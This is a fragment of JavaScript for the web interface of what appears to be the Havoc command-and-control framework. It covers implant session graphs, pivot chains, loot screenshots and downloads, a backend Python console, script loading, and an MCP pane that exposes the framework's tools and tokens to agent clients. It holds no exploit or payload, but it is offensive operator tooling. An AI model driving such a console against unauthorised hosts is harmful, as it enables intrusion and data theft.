        showScriptSource(el, S.scriptSelected);
      };
      row.addEventListener("mousedown", select);
      row.addEventListener("click", select);
      row.addEventListener("contextmenu", (ev) => {
        ev.preventDefault();
        select();
        showContextMenu(ev.clientX, ev.clientY, [
          { label: "加载", action: () => loadSelectedScript(el) },
          { label: "重新加载", action: () => reloadSelectedScript(el) },
          { label: "卸载", action: () => unloadSelectedScript(el) },
          { sep: true },
          { label: "复制路径", action: () => copyText(S.scriptSelected) },
        ]);
      });
    });
  }
  const target = S.scriptSelected && S.scripts.some((s) => s.path === S.scriptSelected)
    ? S.scriptSelected
    : (S.scripts[0] && S.scripts[0].path);
  S.scriptSelected = target;
  if (target) {
    tbody.querySelectorAll("tr").forEach((x) => x.classList.toggle("selected", x.getAttribute("data-path") === target));
    showScriptSource(el, target);
  }
}

async function showScriptSource(el, path) {
  el.querySelector(".script-path").textContent = path;
  const commands = (S.scripts || []).find((s) => s.path === path);
  const cmdBox = el.querySelector(".script-commands");
  if (commands && commands.commands.length) {
    cmdBox.innerHTML = `<div class="script-cmd-title">已注册命令</div>` + commands.commands.map((c) =>
      `<div class="script-cmd"><code>${escapeHtml(c.key)}</code><span>${escapeHtml(c.description || "")}</span></div>`).join("");
  } else {
    cmdBox.innerHTML = "";
  }
  const sourceEl = el.querySelector(".script-source");
  sourceEl.textContent = "加载中…";
  try {
    const data = await api("/api/script?path=" + encodeURIComponent(path));
    sourceEl.textContent = data.source || "";
  } catch (err) {
    sourceEl.textContent = `读取失败：${err.message}`;
  }
}

async function loadSelectedScript(el) {
  if (!S.scriptSelected) { toast("请先选择脚本", "warn"); return; }
  S.scriptLog = [`加载 ${S.scriptSelected} …`];
  el.querySelector(".script-log").textContent = "";
  S.scriptLog.forEach((line) => appendScriptLog(el, line));
  try {
    const data = await api("/api/scripts/load", { method: "POST", body: { path: S.scriptSelected } });
    (data.output || "").split("\n").filter(Boolean).forEach((line) => { S.scriptLog.push(line); });
    (data.commands || []).forEach((c) => S.scriptLog.push(`注册命令：${c.key} — ${c.description || ""}`));
    S.scriptLog.push(`已注册 ${(data.commands || []).length} 条命令`);
    if (data.autoload) S.scriptLog.push("已加入自动加载（网关重启后恢复）");
    toast("脚本已加载", "good");
    await renderScriptsPane(el);
    S.scriptLog.forEach((line) => appendScriptLog(el, line, "good"));
  } catch (err) {
    S.scriptLog.push(`加载失败：${err.message}`);
    appendScriptLog(el, `加载失败：${err.message}`, "error");
    toast("脚本加载失败", "error");
  }
}

async function reloadSelectedScript(el) {
  if (!S.scriptSelected) { toast("请先选择脚本", "warn"); return; }
  S.scriptLog = [`重新加载 ${S.scriptSelected} …`];
  el.querySelector(".script-log").textContent = "";
  S.scriptLog.forEach((line) => appendScriptLog(el, line));
  try {
    const data = await api("/api/scripts/reload", { method: "POST", body: { path: S.scriptSelected } });
    (data.output || "").split("\n").filter(Boolean).forEach((line) => { S.scriptLog.push(line); });
    (data.commands || []).forEach((c) => S.scriptLog.push(`注册命令：${c.key} — ${c.description || ""}`));
    S.scriptLog.push(`重新加载完成：已注册 ${(data.commands || []).length} 条命令`);
    toast("脚本已重新加载", "good");
    await renderScriptsPane(el);
    S.scriptLog.forEach((line) => appendScriptLog(el, line, "good"));
  } catch (err) {
    S.scriptLog.push(`重新加载失败（保留旧注册）：${err.message}`);
    appendScriptLog(el, `重新加载失败（保留旧注册）：${err.message}`, "error");
    toast("脚本重新加载失败", "error");
  }
}

async function unloadSelectedScript(el) {
  if (!S.scriptSelected) { toast("请先选择脚本", "warn"); return; }
  const path = S.scriptSelected;
  const ok = await confirmDialog(
    "卸载脚本",
    `从命令表移除 ${path} 注册的命令/模块？\n脚本文件不会删除；同时会取消自动加载。`);
  if (!ok) return;
  try {
    const data = await api("/api/scripts/unload", { method: "POST", body: { path } });
    S.scriptLog = [`已卸载 ${path}（移除 ${(data.removed_commands || []).length} 条命令 / ${(data.removed_modules || []).length} 个模块）`];
    toast("脚本已卸载", "warn");
    await renderScriptsPane(el);
    S.scriptLog.forEach((line) => appendScriptLog(el, line, "warn"));
  } catch (err) {
    toast(err.message || "卸载失败", "error");
  }
}

async function uploadScript(el, inputEl) {
  const file = inputEl.files && inputEl.files[0];
  inputEl.value = "";
  if (!file) return;
  if (!/\.py$/i.test(file.name)) { toast("只允许上传 .py 脚本", "error"); return; }
  if (file.size > 2 * 1024 * 1024) { toast("脚本不能超过 2MB", "error"); return; }
  const fd = new FormData();
  fd.append("file", file, file.name);
  try {
    const resp = await fetch("/api/scripts/upload", { method: "POST", body: fd, credentials: "same-origin" });
    const data = await resp.json().catch(() => ({}));
    if (!resp.ok || !data.ok) throw new Error(data.message || `HTTP ${resp.status}`);
    S.scriptSelected = data.path;
    toast(`已上传 ${data.name}`, "good");
    await loadSelectedScript(el);
  } catch (err) {
    toast(`上传失败：${err.message}`, "error");
  }
}

function appendScriptLog(el, text, kind = "") {
  const box = el.querySelector(".script-log");
  if (!box) return;
  const line = document.createElement("div");
  if (kind) line.className = kind;
  line.textContent = text;
  box.appendChild(line);
  box.scrollTop = box.scrollHeight;
}

/* ================================================================
   Python 控制台
   ================================================================ */
function renderPyConsolePane(el) {
  el.innerHTML = `
    <div class="py-wrap">
      <pre class="py-output"></pre>
      <div class="py-input-row">
        <textarea class="input py-input" rows="2" spellcheck="false"
          placeholder="Python 代码，Enter 运行，Shift+Enter 换行。例如：len(list_sessions())"></textarea>
        <button class="btn small primary py-run">运行 (Ctrl+Enter)</button>
      </div>
      <div class="py-hint">SDK：Demon / list_sessions / get_session / chat / RegisterCommand；变量在同一标签的生命周期内保持。</div>
    </div>`;
  const out = el.querySelector(".py-output");
  (S.pyLines || []).forEach((line) => appendPyLine(el, line.text, line.kind));
  out.scrollTop = out.scrollHeight;
  const input = el.querySelector(".py-input");
  const run = () => runPython(el);
  el.querySelector(".py-run").addEventListener("click", run);
  input.addEventListener("keydown", (ev) => {
    if (ev.key === "Enter" && !ev.shiftKey) { ev.preventDefault(); run(); }
  });
  setTimeout(() => input.focus(), 40);
}

async function runPython(el) {
  const input = el.querySelector(".py-input");
  const code = input.value;
  if (!code.trim()) return;
  input.value = "";
  S.pyLines = S.pyLines || [];
  S.pyLines.push({ text: `>>> ${code}`, kind: "prompt" });
  appendPyLine(el, `>>> ${code}`, "prompt");
  try {
    const data = await api("/api/python/repl", { method: "POST", body: { code } });
    const output = (data.output || "").replace(/\s+$/, "");
    if (output) {
      S.pyLines.push({ text: output, kind: data.ok ? "out" : "error" });
      appendPyLine(el, output, data.ok ? "out" : "error");
    }
  } catch (err) {
    S.pyLines.push({ text: err.message, kind: "error" });
    appendPyLine(el, err.message, "error");
  }
  input.focus();
}

function appendPyLine(el, text, kind) {
  const out = el.querySelector(".py-output");
  if (!out) return;
  const line = document.createElement("div");
  line.className = `py-line ${kind || ""}`;
  line.textContent = text;
  out.appendChild(line);
  out.scrollTop = out.scrollHeight;
}

/* ================================================================
   会话图
   ================================================================ */
function refreshGraph() {
  if (S.mainView === "graph") renderGraphPane($("#graph-pane"));
}

function showMainView(which) {
  S.mainView = which === "graph" ? "graph" : "table";
  const table = document.querySelector(".sessions-pane");
  const graph = $("#graph-pane");
  if (table) table.classList.toggle("hidden", S.mainView === "graph");
  if (graph) {
    graph.classList.toggle("hidden", S.mainView !== "graph");
    if (S.mainView === "graph") renderGraphPane(graph);
  }
}

function renderGraphPane(el) {
  // 与 Qt 客户端 SessionGraph.cc 对齐：
  // - 树从左到右生长（X_SEP=220、Y_SEP=120）；
  // - 根节点是防火墙图标，会话节点是 90x90 系统图标 + 两行文字；
  // - 直属会话用绿色实线，枢轴用蓝色实线，断开的枢轴用红色实线；
  // - 节点顺序使用 teamserver 的到达顺序（与客户端 SessionTable 插入顺序一致）。
  const sessions = Array.from(S.sessions.values());
  const ids = new Set(sessions.map((s) => s.id));
  const parentOf = new Map();
  sessions.forEach((s) => {
    const parent = s.pivot_parent;
    parentOf.set(s.id, (parent && parent !== s.id && ids.has(parent)) ? parent : "__root__");
  });
  // 防御异常的循环枢轴关系：出现环时该节点回到根，避免递归布局死循环。
  sessions.forEach((s) => {
    const seen = new Set([s.id]);
    let parent = parentOf.get(s.id);
    while (parent && parent !== "__root__") {
      if (seen.has(parent)) {
        parentOf.set(s.id, "__root__");
        break;
      }
      seen.add(parent);
      parent = parentOf.get(parent);
    }
  });
  const children = new Map();
  sessions.forEach((s) => {
    const parent = parentOf.get(s.id);
    if (!children.has(parent)) children.set(parent, []);
    children.get(parent).push(s);
  });

  const X_SEP = 220, Y_SEP = 120, ROOT_X = 100, TOP = 50;
  const pos = new Map();
  let cursor = 0;
  const place = (id, depth) => {
    const kids = children.get(id) || [];
    let y;
    if (!kids.length) {
      y = cursor;
      cursor += Y_SEP;
    } else {
      const ys = kids.map((k) => place(k.id, depth + 1));
      y = (ys[0] + ys[ys.length - 1]) / 2;
    }
    pos.set(id, { x: ROOT_X + depth * X_SEP, y: y + TOP, depth });
    return y;
  };
  place("__root__", 0);

  const maxDepth = Math.max(0, ...Array.from(pos.values()).map((p) => p.depth));
  const maxY = Math.max(TOP, ...Array.from(pos.values()).map((p) => p.y));
  const width = Math.max(420, ROOT_X + maxDepth * X_SEP + 300);
  const height = maxY + 120;
  const esc = escapeHtml;

  const arrow = (tipX, tipY, dirX, dirY, color) => {
    const baseX = tipX + dirX * 9, baseY = tipY + dirY * 9;
    const px = -dirY * 5, py = dirX * 5;
    const f = (n) => Number(n.toFixed(1));
    return `<polygon points="${f(tipX)},${f(tipY)} ${f(baseX + px)},${f(baseY + py)} ${f(baseX - px)},${f(baseY - py)}" fill="${color}"></polygon>`;
  };

  const edgeHtml = (parentId, child) => {
    const p = pos.get(parentId);
    const c = pos.get(child.id);
    if (!p || !c) return "";
    const dx = c.x - p.x, dy = c.y - p.y;
    const len = Math.hypot(dx, dy);
    if (len <= 20) return "";
    const ux = dx / len, uy = dy / len;
    const sx = p.x + ux * 50, sy = p.y + uy * 50;
    const ex = c.x - ux * 50, ey = c.y - uy * 50;
    const pivot = parentId !== "__root__";
    const disconnected = !!child.pivot_disconnected;
    const color = disconnected ? "#e05d5d" : (pivot ? "#4c9aff" : "#4ac27a");
    // 与 Edge::paint 一致：根节点发出的边箭头在父节点侧，枢轴边箭头在子节点侧。
    const arrowHtml = pivot
      ? arrow(ex, ey, -ux, -uy, color)
      : arrow(sx, sy, ux, uy, color);
    return `<line x1="${sx.toFixed(1)}" y1="${sy.toFixed(1)}" x2="${ex.toFixed(1)}" y2="${ey.toFixed(1)}"` +
      ` stroke="${color}" stroke-width="2" stroke-linecap="round"></line>${arrowHtml}`;
  };

  const edges = sessions.map((s) => edgeHtml(parentOf.get(s.id), s)).join("");

  // 投递链虚线：仅 webui 注解，不改变 PivotParent 的树布局；在节点之间画一条
  // 偏离直线的琥珀色曲线，避免和绿色直属边完全重叠。
  const deliveryEdges = (S.showDeliveryEdges === false ? [] : sessions).map((s) => {
    const parent = s.delivery_parent;
    if (!parent || parent === s.id || !ids.has(parent)) return "";
    const p = pos.get(parent), c = pos.get(s.id);
    if (!p || !c) return "";
    // 从两个节点右侧出线，绕到列外侧再进子节点；避免和根节点发出的绿色
    // 边、以及节点下方两行文字重叠（兄弟节点间距只有 120px）。
    const sx = p.x + 46, sy = p.y;
    const ex = c.x + 46, ey = c.y;
    const cx = Math.max(p.x, c.x) + 110;
    const cy = (p.y + c.y) / 2;
    const tdx = ex - cx, tdy = ey - cy;
    const tlen = Math.hypot(tdx, tdy) || 1;
    const task = s.delivery && s.delivery.task_id ? ` · task ${s.delivery.task_id}` : "";
    const tip = `投递链：${parent} → ${s.id}${task}`;
    return `<g class="delivery-edge"><title>${escapeHtml(tip)}</title>` +
      `<path d="M ${sx.toFixed(1)} ${sy.toFixed(1)} Q ${cx.toFixed(1)} ${cy.toFixed(1)} ${ex.toFixed(1)} ${ey.toFixed(1)}"` +
      ` fill="none" stroke="#e0a340" stroke-width="1.8" stroke-dasharray="6 5" opacity="0.95"></path>` +
      `${arrow(ex, ey, tdx / tlen, tdy / tlen, "#e0a340")}</g>`;
  }).join("");

  const nodeHtml = (s) => {
    const p = pos.get(s.id);
    if (!p) return "";
    const st = statusMeta(s.health);
    const dead = s.health === "dead" || s.active === false || s.pivot_disconnected;
    const icon = osIconPath(s, { graph: true });
    const title = `${s.id} @ ${s.process || ""}\\${s.pid || ""}`;
    const sub = `[${s.host || ""}\\${s.user || ""}]`;
    return `<g class="graph-node ${st.cls}${dead ? " disconnected" : ""}" data-demon="${esc(s.id)}" transform="translate(${p.x},${p.y})">
      <rect class="n-hit" x="-96" y="-44" width="216" height="120" fill="transparent"></rect>
      <image class="n-icon${dead ? " dead" : ""}" href="${icon}" x="-40" y="-35" width="90" height="90"></image>
      <text x="-90" y="60" class="n-label">${esc(title)}</text>
      <text x="-80" y="75" class="n-label">${esc(sub)}</text>
    </g>`;
  };

  const rootPos = pos.get("__root__") || { x: ROOT_X, y: TOP };
  const rootHtml = `<g class="graph-node root" transform="translate(${rootPos.x},${rootPos.y})">
      <image href="/static/img/firewall.png" x="-40" y="-50" width="80" height="80"></image>
    </g>`;

  el.innerHTML = `
    <div class="graph-wrap">
      <div class="graph-toolbar">
        <button class="graph-btn graph-zoom-out" type="button" title="缩小（-）">−</button>
        <span class="graph-zoom-label">100%</span>
        <button class="graph-btn graph-zoom-in" type="button" title="放大（+）">+</button>
        <button class="graph-btn graph-fit" type="button" title="适应窗口（0）">适应</button>
      </div>
      <div class="graph-scroll" tabindex="0" title="滚轮缩放 · 拖动背景平移 · + / - / 0">
        <svg class="session-graph" width="100%" height="100%">
          <g class="graph-stage">
            ${edges}
            ${deliveryEdges}
            ${rootHtml}
            ${sessions.map(nodeHtml).join("")}
          </g>
        </svg>
      </div>
    </div>`;

  const scroller = el.querySelector(".graph-scroll");
  const svg = el.querySelector(".session-graph");
  const stage = el.querySelector(".graph-stage");
  const label = el.querySelector(".graph-zoom-label");
  if (!scroller || !svg || !stage) return;
  if (!S.graphView) S.graphView = loadGraphView();

  const size = () => ({ w: scroller.clientWidth || 1200, h: scroller.clientHeight || 800 });
  const fit = (persist = true) => {
    const { w, h } = size();
    const pad = 48;
    const k = Math.min(1, Math.max(0.3, Math.min((w - pad * 2) / width, (h - pad * 2) / height)));
    S.graphView = { k, tx: (w - width * k) / 2, ty: (h - height * k) / 2 };
    applyView(persist);
  };
  const applyView = (persist = true) => {
    const v = S.graphView;
    stage.setAttribute("transform",
      `translate(${v.tx.toFixed(2)},${v.ty.toFixed(2)}) scale(${v.k.toFixed(4)})`);
    if (label) label.textContent = `${Math.round(v.k * 100)}%`;
    if (persist) saveGraphView(v);
  };
  const zoomAt = (clientX, clientY, factor) => {
    const v = S.graphView;
    const rect = svg.getBoundingClientRect();
    const px = clientX - rect.left;
    const py = clientY - rect.top;
    const k = Math.min(3, Math.max(0.3, v.k * factor));
    if (Math.abs(k - v.k) < 1e-6) return;
    // 保持光标下的世界坐标不动：tx' = px - (px - tx) * (k' / k)
    v.tx = px - (px - v.tx) * (k / v.k);
    v.ty = py - (py - v.ty) * (k / v.k);
    v.k = k;
    applyView();
  };
  const zoomCenter = (factor) => {
    const rect = svg.getBoundingClientRect();
    zoomAt(rect.left + rect.width / 2, rect.top + rect.height / 2, factor);
  };

  if (!S.graphView) fit(false);
  else applyView(false);

  el.querySelector(".graph-zoom-in").addEventListener("click", () => zoomCenter(1.2));
  el.querySelector(".graph-zoom-out").addEventListener("click", () => zoomCenter(1 / 1.2));
  el.querySelector(".graph-fit").addEventListener("click", () => fit());

  scroller.addEventListener("wheel", (ev) => {
    ev.preventDefault();
    zoomAt(ev.clientX, ev.clientY, Math.exp(-ev.deltaY * 0.0015));
  }, { passive: false });

  scroller.addEventListener("keydown", (ev) => {
    if (ev.key === "+" || ev.key === "=") { ev.preventDefault(); zoomCenter(1.2); }
    else if (ev.key === "-" || ev.key === "_") { ev.preventDefault(); zoomCenter(1 / 1.2); }
    else if (ev.key === "0") { ev.preventDefault(); fit(); }
  });

  // 拖动背景平移。用 pointer capture，避免每次重渲染向 document 累积监听器。
  let panning = false, startX = 0, startY = 0, baseTx = 0, baseTy = 0, panMoved = false;
  scroller.addEventListener("pointerdown", (ev) => {
    if (ev.button !== 0) return;
    if (ev.target.closest(".graph-node")) { panMoved = false; return; }
    panning = true;
    panMoved = false;
    startX = ev.clientX;
    startY = ev.clientY;
    baseTx = S.graphView.tx;
    baseTy = S.graphView.ty;
    scroller.classList.add("panning");
    scroller.focus();
    try { scroller.setPointerCapture(ev.pointerId); } catch (e) { /* ignore */ }
    ev.preventDefault();
  });
  scroller.addEventListener("pointermove", (ev) => {
    if (!panning) return;
    const dx = ev.clientX - startX;
    const dy = ev.clientY - startY;
    if (!panMoved && Math.hypot(dx, dy) < 3) return;
    panMoved = true;
    S.graphView.tx = baseTx + dx;
    S.graphView.ty = baseTy + dy;
    applyView();
  });
  const endPan = (ev) => {
    if (!panning) return;
    panning = false;
    scroller.classList.remove("panning");
    try { scroller.releasePointerCapture(ev.pointerId); } catch (e) { /* ignore */ }
  };
  scroller.addEventListener("pointerup", endPan);
  scroller.addEventListener("pointercancel", endPan);

  scroller.addEventListener("contextmenu", (ev) => {
    if (!ev.target.closest(".graph-node")) ev.preventDefault();
  });

  el.querySelectorAll("g.graph-node[data-demon]").forEach((g) => {
    g.addEventListener("dblclick", () => openConsole(g.getAttribute("data-demon")));
    g.addEventListener("click", (ev) => {
      if (panMoved) { panMoved = false; return; }
      const id = g.getAttribute("data-demon");
      if (id) openConsole(id);
    });
    g.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      ev.stopPropagation();
      const id = g.getAttribute("data-demon");
      if (id) showSessionMenu(id, ev.clientX, ev.clientY);
    });
  });
}

/* ---------------- 会话图视图状态（缩放/平移） ---------------- */
const GRAPH_VIEW_KEY = "havoc.graphView.v1";
function loadGraphView() {
  try {
    const raw = JSON.parse(localStorage.getItem(GRAPH_VIEW_KEY) || "null");
    if (raw && Number.isFinite(raw.k) && Number.isFinite(raw.tx) && Number.isFinite(raw.ty)) {
      return { k: Math.min(3, Math.max(0.3, raw.k)), tx: raw.tx, ty: raw.ty };
    }
  } catch (e) { /* ignore */ }
  return null;
}
function saveGraphView(view) {
  if (S.graphViewSaveTimer) return;
  S.graphViewSaveTimer = setTimeout(() => {
    S.graphViewSaveTimer = null;
    try { localStorage.setItem(GRAPH_VIEW_KEY, JSON.stringify(view)); } catch (e) { /* ignore */ }
  }, 150);
}

/* ================================================================
   战利品
   ================================================================ */
function lootDate(item) {
  return item.ts ? fmtDateTime(item.ts) : (item.time || "");
}

function downloadLoot(item) {
  if (!item) return;
  if (!item.path) { toast("该战利品尚未落地完成", "warn"); return; }
  // 由后端设置 Content-Disposition（含 RFC 5987 中文文件名），同源下载不需要 blob。
  const a = document.createElement("a");
  a.href = `/api/loot/${encodeURIComponent(item.id)}?download=1`;
  const fallback = item.kind === "screenshot" ? `screenshot-${item.id}.png` : `loot-${item.id}`;
  a.download = String(item.name || fallback).split(/[\\/]/).pop() || fallback;
  document.body.appendChild(a);
  a.click();
  a.remove();
  toast(`正在下载：${a.download}`, "info", 2500);
}

function renderLootPane(el) {
  const sessions = Array.from(S.sessions.values());
  el.innerHTML = `
    <div class="loot-wrap">
      <div class="loot-toolbar">
        <span class="spacer"></span>
        <label>AgentID：</label>
        <select class="input loot-agent"></select>
        <label>显示：</label>
        <select class="input loot-show"><option>截图</option><option>下载</option></select>
        <span class="spacer"></span>
      </div>
      <div class="loot-images">
        <div class="loot-split">
          <div class="data-table-wrap loot-list">
            <table class="data-table loot-table">
              <thead><tr><th>名称</th><th>日期</th></tr></thead>
              <tbody></tbody>
            </table>
          </div>
          <div class="h-split loot-splitter" title="拖动调整宽度"></div>
          <div class="loot-preview"><img alt="" class="hidden"></div>
        </div>
      </div>
      <div class="loot-downloads hidden">
        <div class="data-table-wrap">
          <table class="data-table loot-dl-table">
            <thead><tr><th>名称</th><th>大小</th><th>日期</th></tr></thead>
            <tbody></tbody>
          </table>
        </div>
      </div>
    </div>`;
  const agentSel = el.querySelector(".loot-agent");
  const showSel = el.querySelector(".loot-show");
  agentSel.innerHTML = `<option value="">[ All ]</option>` +
    sessions.map((s) => `<option value="${escapeHtml(s.id)}">${escapeHtml(s.id)}</option>`).join("");
  agentSel.value = S.lootAgent || "";
  showSel.value = S.lootShow || "截图";
  agentSel.addEventListener("change", () => { S.lootAgent = agentSel.value; renderLootTables(el); });
  showSel.addEventListener("change", () => { S.lootShow = showSel.value; renderLootTables(el); });

  const split = el.querySelector(".loot-splitter");
  const tableWrap = el.querySelector(".loot-list");
  let drag = false;
  split.addEventListener("mousedown", (ev) => {
    ev.preventDefault();
    drag = true;
    const wrap = el.querySelector(".loot-split").getBoundingClientRect();
    const move = (e) => {
      if (!drag) return;
      const w = Math.max(180, Math.min(wrap.width * 0.7, e.clientX - wrap.left));
      tableWrap.style.flex = `0 0 ${w}px`;
      tableWrap.style.width = `${w}px`;
    };
    const up = () => {
      drag = false;
      document.removeEventListener("mousemove", move);
      document.removeEventListener("mouseup", up);
    };
    document.addEventListener("mousemove", move);
    document.addEventListener("mouseup", up);
  });
  renderLootTables(el);
}

function renderLootTables(el) {
  const agent = el.querySelector(".loot-agent").value;
  const show = el.querySelector(".loot-show").value;
  const images = el.querySelector(".loot-images");
  const downloads = el.querySelector(".loot-downloads");
  const isShots = show !== "下载";
  images.classList.toggle("hidden", !isShots);
  downloads.classList.toggle("hidden", isShots);

  const items = Array.from(S.loot).filter((it) => (agent ? it.demon === agent : true));
  const shots = items.filter((it) => it.kind === "screenshot").reverse();
  const dls = items.filter((it) => it.kind !== "screenshot").reverse();

  const tbody = el.querySelector(".loot-table tbody");
  tbody.innerHTML = shots.map((it) => `
    <tr data-id="${escapeHtml(it.id)}">
      <td class="name">${escapeHtml(it.name || "—")}</td>
      <td class="ctr">${escapeHtml(lootDate(it))}</td>
    </tr>`).join("") || `<tr><td colspan="2" class="muted">暂无截图</td></tr>`;
  tbody.querySelectorAll("tr[data-id]").forEach((tr) => {
    tr.title = "单击预览，右键/双击下载原始 PNG";
    tr.addEventListener("click", () => {
      const item = S.loot.find((l) => String(l.id) === tr.getAttribute("data-id"));
      if (!item) return;
      tbody.querySelectorAll("tr").forEach((r) => r.classList.toggle("selected", r === tr));
      const img = el.querySelector(".loot-preview img");
      img.src = `/api/loot/${encodeURIComponent(item.id)}`;
      img.classList.remove("hidden");
      img.alt = item.name || "";
    });
    tr.addEventListener("dblclick", () => {
      downloadLoot(S.loot.find((l) => String(l.id) === tr.getAttribute("data-id")));
    });
    tr.addEventListener("contextmenu", (ev) => {
      ev.preventDefault();
      const item = S.loot.find((l) => String(l.id) === tr.getAttribute("data-id"));
      if (!item) return;
      showContextMenu(ev.clientX, ev.clientY, [
        { label: "预览", action: () => tr.click() },
        { label: "下载", action: () => downloadLoot(item) },
      ]);
    });
  });

  const dlBody = el.querySelector(".loot-dl-table tbody");
  dlBody.innerHTML = dls.map((it) => `
    <tr data-id="${escapeHtml(it.id)}">
      <td class="name">${escapeHtml(it.name || "—")}</td>
      <td class="ctr">${escapeHtml(fmtSize(it.size))}</td>
      <td class="ctr">${escapeHtml(lootDate(it))}</td>
    </tr>`).join("") || `<tr><td colspan="3" class="muted">暂无下载文件</td></tr>`;
  dlBody.querySelectorAll("tr[data-id]").forEach((tr) => {
    tr.title = "点击下载到浏览器";
    tr.addEventListener("click", () => {
      downloadLoot(S.loot.find((l) => String(l.id) === tr.getAttribute("data-id")));
    });
  });
}

/* ================================================================
   团队服务器
   ================================================================ */
function renderTeamserverPane(el) {
  el.innerHTML = `
    <div class="teamserver-pane">
      <div class="ts-log" tabindex="0"></div>
    </div>`;
  const log = el.querySelector(".ts-log");
  const lines = Array.from(S.events).filter((e) => e.source === "teamserver").slice(-2000);
  log.innerHTML = lines.map(tsLineHtml).join("");
  log.scrollTop = log.scrollHeight;
}

function tsLineHtml(e) {
  return `<div class="ts-line ${escapeHtml(e.level || "info")}" data-id="${escapeHtml(e.id)}">${escapeHtml(e.text)}</div>`;
}

function appendTeamserverLine(el, event) {
  const log = el.querySelector(".ts-log");
  if (!log) return;
  log.insertAdjacentHTML("beforeend", tsLineHtml(event));
  while (log.childElementCount > 2000) log.removeChild(log.firstChild);
  log.scrollTop = log.scrollHeight;
}

/* ================================================================
   事件查看器
   ================================================================ */
function eventRowHtml(e) {
  const tag = { good: "[+]", info: "[*]", warn: "[!]", error: "[-]", chat: "[#]", debug: "[.]" }[e.level] || "[*]";
  return `<div class="event-row ${e.level || "info"}" data-id="${e.id}">
    <span class="t">${escapeHtml(fmtDateTime(e.ts))}</span>
    <span class="tag ${escapeHtml(e.level || "info")}">${tag}</span>
    <span class="m">${escapeHtml(e.text)}</span>
  </div>`;
}
function renderEvents(force) {
  const list = $("#event-list");
  // 客户端事件查看器只显示 Packager 汇总的事件；teamserver 原始日志在“团队服务器”标签。
  const events = S.events.filter((e) => e.source !== "teamserver").slice(-1500);
  const nearBottom = list.scrollHeight - list.scrollTop - list.clientHeight < 60;
  list.innerHTML = events.map(eventRowHtml).join("");
  if (force || nearBottom) list.scrollTop = list.scrollHeight;
}
function appendEvent(e) {
  if (e.source === "teamserver") return;
  const list = $("#event-list");
  const nearBottom = list.scrollHeight - list.scrollTop - list.clientHeight < 60;
  list.insertAdjacentHTML("beforeend", eventRowHtml(e));
  while (list.childElementCount > 1500) list.removeChild(list.firstChild);
  if (nearBottom) list.scrollTop = list.scrollHeight;
}
function toggleEventDock(show) {
  S.eventDockOpen = show == null ? !S.eventDockOpen : !!show;
  $("#event-dock").classList.toggle("hidden", !S.eventDockOpen);
  const splitter = $("#v-splitter");
  if (splitter) splitter.classList.toggle("hidden", !S.eventDockOpen);
}

/* ================================================================
   MCP 管理（运行态启停 / 令牌 / 客户端配置）
   ================================================================ */
function mcpUptime(sec) {
  let n = Math.max(0, Math.floor(Number(sec) || 0));
  const d = Math.floor(n / 86400); n -= d * 86400;
  const h = Math.floor(n / 3600); n -= h * 3600;
  const m = Math.floor(n / 60);
  const s = n % 60;
  if (d) return `${d} 天 ${h} 小时 ${m} 分`;
  if (h) return `${h} 小时 ${m} 分`;
  if (m) return `${m} 分 ${s} 秒`;
  return `${s} 秒`;
}

function renderMcpPane(el) {
  el.innerHTML = `
    <div class="mcp-wrap">
      <div class="mcp-head">
        <span class="mcp-badge"><span class="dot"></span><span class="mcp-state">加载中…</span></span>
        <span class="mcp-meta dim"></span>
        <span class="spacer"></span>
        <button class="btn small mcp-refresh">刷新</button>
        <button class="btn small mcp-toggle" disabled>加载中…</button>
      </div>
      <div class="mcp-scroll">
        <div class="mcp-grid">
          <section class="mcp-card">
            <h3>端点</h3>
            <div class="mcp-kv"><span>地址</span><code class="mcp-endpoint">—</code></div>
            <div class="mcp-kv"><span>监听端口</span>
              <span class="mcp-port-edit">
                <input class="input mcp-port-input" type="number" min="0" max="65535" step="1" title="0 = 复用 WebUI 端口" disabled>
                <button class="btn small mcp-port-apply" disabled>应用</button>
              </span>
            </div>
            <div class="mcp-port-note dim"></div>
            <div class="mcp-kv"><span>传输</span><span class="mcp-transport">—</span></div>
            <div class="mcp-kv"><span>协议</span><span class="mcp-protocols">—</span></div>
            <div class="mcp-kv"><span>MCP 会话</span><span class="mcp-sessions">—</span></div>
            <div class="mcp-kv"><span>回环网关</span><code class="mcp-base">—</code></div>
          </section>
          <section class="mcp-card">
            <h3>令牌</h3>
            <div class="mcp-kv"><span>文件</span><code class="mcp-token-file">—</code></div>
            <div class="mcp-kv"><span>掩码</span><code class="mcp-token-masked">—</code></div>
            <div class="mcp-actions">
              <button class="btn small mcp-copy-token">复制令牌</button>
              <button class="btn small mcp-show-token">显示</button>
              <button class="btn small danger mcp-rotate-token">轮换</button>
            </div>
            <div class="mcp-token-note dim"></div>
          </section>
          <section class="mcp-card">
            <h3>能力</h3>
            <div class="mcp-counts">
              <div><b class="mcp-count-tools">0</b><span>工具</span></div>
              <div><b class="mcp-count-resources">0</b><span>资源</span></div>
              <div><b class="mcp-count-prompts">0</b><span>提示词</span></div>
            </div>
            <div class="mcp-sub">只读资源</div>
            <div class="mcp-res-list dim">—</div>
            <div class="mcp-sub">提示词</div>
            <div class="mcp-prompt-list dim">—</div>
          </section>
        </div>
        <section class="mcp-card">
          <h3>客户端配置 <span class="spacer"></span>
            <button class="btn small mcp-copy-http">复制 HTTP（含令牌）</button>
            <button class="btn small mcp-copy-stdio">复制 stdio</button>
          </h3>
          <div class="mcp-sub">HTTP（Streamable HTTP）</div>
          <pre class="mcp-pre mcp-cfg-http"></pre>
          <div class="mcp-sub">stdio（本机客户端）</div>
          <pre class="mcp-pre mcp-cfg-stdio"></pre>
        </section>
        <section class="mcp-card">
          <h3>工具列表 <span class="spacer"></span>
            <button class="btn small mcp-toggle-tools">展开</button>
          </h3>
          <div class="mcp-tool-grid hidden"></div>
        </section>
        <section class="mcp-card">
          <h3>最近 MCP 事件 <span class="spacer"></span>
            <span class="dim">启动 / 停止 / 令牌轮换 / 工具调用审计</span>
          </h3>
          <div class="mcp-events"></div>
        </section>
        <div class="mcp-error hidden"></div>
      </div>
    </div>`;

  el.querySelector(".mcp-refresh").addEventListener("click", () => refreshMcpPane(el));
  el.querySelector(".mcp-toggle").addEventListener("click", () => {
    const action = el.querySelector(".mcp-toggle").dataset.action;
    if (action) mcpControl(action, el);
  });
  el.querySelector(".mcp-copy-token").addEventListener("click", () => mcpCopyToken(el));
  el.querySelector(".mcp-show-token").addEventListener("click", () => mcpShowToken(el));
  el.querySelector(".mcp-rotate-token").addEventListener("click", () => mcpRotateToken(el));
  el.querySelector(".mcp-port-apply").addEventListener("click", () => mcpApplyPort(el));
